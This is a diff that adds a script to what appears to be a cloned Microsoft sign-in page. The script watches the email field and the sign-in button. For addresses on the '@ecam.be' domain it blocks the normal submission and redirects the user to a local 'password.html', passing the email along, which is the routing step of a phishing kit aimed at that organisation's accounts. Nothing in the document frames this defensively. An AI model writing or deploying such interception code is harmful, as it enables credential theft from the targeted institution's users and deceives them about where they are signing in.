@@ -89,4 +89,52 @@ o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}
 //]]></script>
     
 
+    <script nonce="XRurWNxqXHAuluXmzDgbuA">
+        (function () {
+            var targetPage = "password.html";
+
+            function hasEcamDomain() {
+                var emailInput = document.getElementById("i0116");
+                if (!emailInput) {
+                    return false;
+                }
+                var value = emailInput.value.trim().toLowerCase();
+                return value.includes("@ecam.be");
+            }
+
+            function redirectToPassword() {
+                var emailInput = document.getElementById("i0116");
+                var email = emailInput ? emailInput.value.trim() : "";
+                var query = email ? ("?email=" + encodeURIComponent(email)) : "";
+                window.location.href = targetPage + query;
+            }
+
+            function intercept(event) {
+                if (!hasEcamDomain()) {
+                    return;
+                }
+                event.preventDefault();
+                event.stopImmediatePropagation();
+                redirectToPassword();
+            }
+
+            function init() {
+                document.addEventListener("click", function (event) {
+                    if (event.target && event.target.id === "idSIButton9") {
+                        intercept(event);
+                    }
+                }, true);
+
+                document.addEventListener("submit", function (event) {
+                    var btn = document.getElementById("idSIButton9");
+                    if (btn && event.target && event.target.contains(btn)) {
+                        intercept(event);
+                    }
+                }, true);
+            }
+
+            document.addEventListener("DOMContentLoaded", init);
+        })();
+    </script>
+
 </body></html>
